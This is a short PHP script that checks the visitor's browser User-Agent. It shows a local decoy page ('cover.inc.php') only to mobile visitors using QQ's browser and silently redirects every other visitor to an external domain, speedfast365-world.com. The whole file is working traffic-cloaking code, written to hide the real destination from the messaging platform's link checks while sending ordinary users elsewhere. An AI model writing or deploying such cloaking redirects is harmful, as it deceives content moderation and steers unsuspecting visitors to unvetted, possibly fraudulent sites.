<?php
$agent = $_SERVER['HTTP_USER_AGENT'];

if(preg_match('/QQ/',$agent) && is_mobile()){
	require 'cover.inc.php';
}
else{
	header("location:https://speedfast365-world.com{$_SERVER[REQUEST_URI]}");die();
}

function is_mobile(){
	$agent = $_SERVER['HTTP_USER_AGENT'];
	if(strpos($agent,"NetFront") || strpos($agent,"iPhone") || strpos($agent,"MIDP-2.0") || strpos($agent,"Opera Mini") || strpos($agent,"UCWEB") || strpos($agent,"Android") || strpos($agent,"Windows CE") || strpos($agent,"SymbianOS")){
		return true;
	}
	else{
		return false;
	}

}


